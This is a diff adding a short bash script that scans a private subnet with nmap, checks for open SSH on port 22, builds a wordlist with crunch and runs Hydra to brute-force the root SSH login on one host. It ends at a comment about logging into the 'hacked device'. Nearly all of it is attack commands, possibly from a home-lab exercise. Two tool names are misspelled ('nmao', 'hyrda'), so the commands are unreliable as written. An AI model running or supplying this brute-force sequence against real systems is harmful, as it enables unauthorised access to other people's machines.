@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# View devices on network with nmap device scan
+nmap -sn 192.168.0.0/24
+
+# check for open running ports 22
+nmao -sV -p 22 192.168.0.0/24
+
+# create a dictionary list for attack
+crunch 4 5 -p Bad Password Bro > dictionary.txt
+
+# Run Hydra to crack SSH
+hyrda -l root -P dictionary.txt 192.168.0.8 ssh
+
+# SSH into hacked device
+
